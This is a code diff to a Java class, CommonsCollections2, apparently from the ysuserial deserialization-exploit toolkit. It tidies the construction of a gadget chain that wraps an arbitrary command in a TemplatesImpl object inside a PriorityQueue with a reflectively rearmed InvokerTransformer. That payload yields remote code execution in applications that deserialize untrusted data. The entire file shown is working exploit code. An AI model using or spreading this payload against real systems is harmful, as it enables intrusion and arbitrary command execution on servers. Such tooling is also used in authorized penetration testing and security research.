@@ -29,23 +29,14 @@ import org.su18.ysuserial.payloads.util.Reflections;
 public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {
 
 	public Queue<Object> getObject(final String command) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
-		// mock method name until armed
-		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-
-		// create queue with numbers and basic comparator
-		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
-		// stub data for replacement later
+		final Object                templates   = Gadgets.createTemplatesImpl(command);
+		final InvokerTransformer    transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+		final PriorityQueue<Object> queue       = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
 		queue.add(1);
 		queue.add(1);
 
-		// switch method called by comparator
 		Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
-
-		// switch contents of queue
-		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-		queueArray[0] = templates;
-		queueArray[1] = 1;
+		Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});
 
 		return queue;
 	}
